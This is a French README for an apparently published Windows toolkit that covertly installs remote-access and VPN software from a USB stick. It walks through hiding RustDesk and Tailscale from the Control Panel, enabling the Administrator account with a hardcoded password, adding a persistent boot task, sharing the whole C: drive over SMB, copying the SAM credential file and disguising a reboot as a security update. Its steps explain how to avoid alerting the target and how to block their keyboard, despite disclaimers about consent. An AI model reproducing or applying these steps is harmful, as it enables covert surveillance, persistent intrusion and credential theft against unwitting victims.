<br>
<p align="center">
  <h2 align="center">Full access via 1-click CMD - bgmorito 29/11/23</h2>
  <p align="center">
    <br>
    <br>
  </p>
</p>

/!\ **Ce projet a pour but de tester la sécurité et la fiabilité de vos amis. Ce projet ne doit en aucun cas être utilisé pour nuire à autrui et n'est pas à utiliser sans consentement.** /!\
/!\ **Ce projet est un projet de test dont le but était d' "installer" un accès à distance ainsi qu'une solution VPN pour un accès aux fichiers facile, ne pas utiliser sans consentement.** /!\

## Sommaire

* [A Propos](#A-Propos)
* [Pour Utiliser](#Pour-Utiliser)
  * [Prérequis](#Prérequis)
  * [Préparation](#Préparation)
* [Roadmap](#Roadmap)
* [Contribuer](#Contribuer)
* [License](#License)
* [Autheurs](#Autheurs)

## A Propos

Ce projet est une démo d'accès facile aux données d'une cible. Il est conseillé de l'utiliser depuis une clé USB puisqu'il récupère des informations de la cible (tel que l'ID RustDesk).
Il n'est pas à utiliser sans consentement et est destiné à la sensibilisation. Les virus et autres malwares ne sont généralement pas aussi visibles et faciles à détecter.
Le projet est possible grâce à 2 outils principaux :
* [RustDesk](https://rustdesk.com/) (Accès à distance, équivalent à TeamViewer, dont l'installation est malheureusement pas automatisable entièrement à l'heure actuelle)
* [Tailscale](https://tailscale.com/) (Alternative VPN, permet par exemple d'accéder aux fichiers de la cible et de savoir si elle est connectée à internet)

[Rusty Launcher](/bgmorito_29-11-23/Rusty_Launcher.cmd) est le fichier principal du projet.
Il va tout d'abord copier les fichiers importants dans C:\Temp dans le but de les exécuter plus tard.
Il va ensuite vérifier s'il est lancé en tant qu'administrateur et si ce n'est pas le cas, il va demander les droits d'administrateur et se relancer en tant qu'administrateur. (Un bug est actuellement présent, l'invite de commande originale ne se ferme pas, un fix temporaire est de fermer cmd.exe à la fin du programme)
Une fois lancé en tant qu'administrateur, il va récupérer la liste des utilisateurs locaux et l'enregistrer dans ID\AccountList.txt.
Il installe ensuite RustDesk via [RustInstallDesk.ps1](/bgmorito_29-11-23/RustInstallDesk.ps1), attends puis configure les paramètres de RustDesk avant d'enregistrer l'ID. (Pour le moment, uniquement le mot de passe permanent, le serveur de rendez-vous et la clé du serveur)
Il installe ensuite Tailscale et attends.
Il configure ensuite, via [HideRustScale.ps1](/bgmorito_29-11-23/HideRustScale.ps1) les paramètres de Tailscale et cache les deux programmes des Paramètres et du Panneau de configuration. Notez qu'il est configuré pour se connecter à un compte Tailscale déjà existant via une clé d'authentification.
Il supprime ensuite les fichiers temporaires, les raccourcis RustDesk et Tailscale, copie [Edge_Runner_Esc](/bgmorito_29-11-23/Edge_Runner_Esc.cmd) dans C:\Windows\System32, et récupère l'ID en tant que ID\RustID.txt.
Il va ensuite activer et changer le mot de passe Administrateur/Administrator pour "CoucouWas-hereAdmin".
Enfin, il va créer une tâche planifiée qui va lancer [Edge_Runner_Esc](/bgmorito_29-11-23/Edge_Runner_Esc.cmd) à chaque démarrage de la machine et de session. Et copie le fichier SAM de la cible dans ID\SAM avant de planifier un redémarrage sous 60sc comme "Mise à jour de sécurité" et fermer tout cmd.exe. (Le redémarrage est nécessaire pour enlever les Icones "Tray" de RustDesk et Tailscale)

[Edge_Runner_Esc](/bgmorito_29-11-23/Edge_Runner_Esc.cmd) est un fichier qui doit se lancer à chaque démarrage de la machine et de session.
Il va activer le compte "Administrateur"/"Administrator" et lui attribuer un mot de passe (ici "CoucouWas-hereAdmin") pour s'assurer d'avoir un accès administrateur à la machine.

[RustInstallDesk](/bgmorito_29-11-23/RustInstallDesk.ps1) est un script PowerShell qui va installer RustDesk dérivé du [script officiel](https://rustdesk.com/docs/en/self-host/client-deployment/).
Les modifications sont les suivantes :
* Récupère le mot de passe permanent via le fichier [RustPass.txt](/bgmorito_29-11-23/RustPass.txt) (originalement, le mot de passe permanent est généré aléatoirement)
* Récupérer le serveur de rendez-vous via le fichier [RustServer.txt](/bgmorito_29-11-23/RustServer.txt) (originalement, le serveur de rendez-vous est "rendezvous.rustdesk.com")
* Se déplace dans C:\Temp pour lancer le programme d'installation pré-téléchargé (originalement, le programme d'installation est téléchargé, la version pré-téléchargée est plus rapide et permet d'éviter une installation non à jour)
* Le temps d'attente du script est diminué de 5 secondes
* Il ne renvoie pas dans la fenêtre PowerShell le mot de passe permanent et l'ID, il ne fait qu'enregistrer l'ID dans le fichier ID\RustID.txt

[HideRustScale](/bgmorito_29-11-23/HideRustScale.ps1) est un script PowerShell qui va configurer Tailscale et cacher les programmes RustDesk et Tailscale des Paramètres et du Panneau de configuration.
Cela se passe en 3 étapes.
La première est l'arrêt du service Tailscale puis le démarrage de celui-ci avec votre clé d'authentification et enfin un reset de la configuration de Tailscale. Il va enfin, créer un SMB Share sur le dossier C:\ et donner un accès complet au groupe "Administrateurs".
La seconde étape est la modification/l'ajout de clés de registre pour cacher les programmes RustDesk et Tailscale des Paramètres et du Panneau de configuration.
La troisième étape est la configuration finale de Tailscale. Cela est fait à la fin pour éviter que Tailscale ne prenne pas en compte la configurations, ce qui peut arriver.

[RustPass](/bgmorito_29-11-23/RustPass.txt) est le fichier texte contenant le mot de passe permanent qui sera configuré dans RustDesk.

[Uninstall\tailscale Uninstall]('/bgmorito_29-11-23/Uninstall/tailscale Uninstall.lmk') est le lien symbolique pour désinstaller Tailscale.

[Uninstall\Uninstall RustDesk]('/bgmorito_29-11-23/Uninstall/Uninstall RustDesk.lnk') est le lien symbolique pour désinstaller RustDesk.

## Pour Utiliser

Pour utiliser ce projet, suivez les étapes suivantes :

### Prérequis

* Clé/Stockage USB (conseillé, amorçage du programme)
* Clone du dossier [bgmorito_29-11-23](/bgmorito_29-11-23)
* L'installeur de [RustDesk.exe](https://github.com/rustdesk/rustdesk/releases/latest) (disponible sur le Github officiel)
* L'installeur de [Tailscale.msi](https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi) (disponible sur le site officiel, attention à bien prendre la version .msi et non le .exe)
* Un compte Tailscale et une clé d'authentification (Créez la clé [ici](https://login.tailscale.com/admin/settings/keys))
* Un serveur de rendez-vous RustDesk (de préférence un serveur personnel, documentation [ici](https://rustdesk.com/docs/en/self-host/))

### Préparation

0. Téléchargez le dossier [bgmorito_29-11-23](/bgmorito_29-11-23) et placez le dans la clé USB
</br>0.a Mettez les installeurs de RustDesk et Tailscale dans le dossier [bgmorito_29-11-23](/bgmorito_29-11-23) sous les noms "rustdesk.exe" et "tailscale.msi"

1. Modifiez le programme "RustInstallDesk" pour donner la configuration réseau de RustDesk (valeur "$Cda8s_cfg" ligne 5)
2. Modifiez le programme "HideRustScale" pour donner la clé d'authentification Tailscale (après "--auth-key=" ligne 3 et 50)
3. Débranchez la clé USB
4. Branchez la clé USB sur la machine cible
5. Lancez le fichier [Rusty_Launcher.cmd](/bgmorito_29-11-23/Rusty_Launcher.cmd)
6. Une fois le programme lancé, s'il y a une demande d'élévation de privilège, donnez les droits d'administrateur
7. Une fois le programme lancé, attendez que le programme se ferme tout seul
8. Une fois le programme fermé, débranchez la clé USB
9. Lancez RustDesk et activez la modification des paramètres de RustDesk en accès à distance dans la catégorie "Sécurité"

{Mettre la procédure}

10. Redémarrez la machine cible dès que possible (pour éviter que la cible ne remarque les changements), si cela n'est pas possible, le redémarrage sera automatique sous 60sc et devrait redémarrer tout les programmes et services automatiquement

11. Il est maintenant temps de voir le résultat, pour cela, branchez la clé USB sur votre machine
12. L'identifiant RustDesk est disponible dans le fichier ID\RustID.txt, connectez-vous à la machine cible avec RustDesk et enregistrez le mot de passe permanent lors de la connexion. (Si la cible est devant la machine, ne faites pas cette étape, cela alertera la cible) Si vous avez fait l'installation depuis la machine cible, passez à l'étape 13 avant revenir à cette étape.
</br>12.a Paramétrez RustDesk comme vous le souhaitez, il est conseillé d'activer le mode "Privé", l'activer lors de la connexion et désactiver l'appuis des touches de la cible.
</br>{Mettre la procédure}
</br>12.b Déconnectez-vous de la machine cible ; Notez qu'à chaque connexion, l'icone "Tray" de RustDesk se remettra jusqu'au prochain redémarrage

13. Allez dans le panneau de configuration de Tailscale et connectez-vous avec votre compte Tailscale
14. Une fois connecté, vous devriez voir la machine cible dans la liste des machines connectées
{Mettre les configs de Tailscale}
15. Vous pouvez maintenant accéder aux fichiers de la machine cible via le partage SMB et Tailscale
16. Pour cela, allez dans l'explorateur de fichier et allez dans "Réseau", vous devriez voir la machine cible dans la liste des machines connectées
17. Cliquez sur la machine cible et entrez les identifiants de la machine cible (Administrateur/Administrator et "CoucouWas-hereAdmin")
18. Vous avez maintenant accès aux fichiers de la machine cible. Notez que l'identifiant RustDesk est disponible dans "C:\Windows\System32\Microsoft\Cdi8-r.txt"
19. Pour désinstaller RustDesk et Tailscale de la machine, lancez les raccourcis dans le dossier "Uninstall" de la clé USB sur la machine cible et entrez la commande `Remove-SmbShare -Name bgmorito` dans un PowerShell en tant qu'administrateur
20. Pour supprimer le mot de passe Administrateur/Administrator et désactiver le compte Administrateur/Administrator, supprimez le fichier C:\Windows\System32\Edge_Runner.cmd, puis faites `net user Administrateur "" && net user Administrateur /active:no` dans un PowerShell en tant qu'administrateur (remplacez "Administrateur" par "Administrator" si vous êtes sur une version anglaise de Windows)

## Roadmap

* Ajouter une vérification de la langue du système et adapter HideRustScale en fonction (SMB Share)
* Fix le bug du premier invite de commande qui ne se ferme pas
* Remettre le SMB Share en place via Edge_Runner_Esc
* Ajouter une vérification de la langue du système et adapter Edge_Runner_Esc
* Ajouter les procédures sur le README.md

## Contribuer

* Si vous avez des suggestions pour ajouter ou supprimer des projets, n'hésitez pas à [Issues](https://github.com/E5-MMGE/Coucou/issues) pour en discuter, ou créez directement une demande d'extraction après avoir édité le fichier *README.md* avec les changements nécessaires.
* Créer un PR individuel pour chaque suggestion.

## License

Distribué sous la license WTFPL. Voir [WTFPL](http://www.wtfpl.net/about/) pour plus d'information.

## Autheurs

* [Nikki Devil](https://github.com/Nikki-Devil/)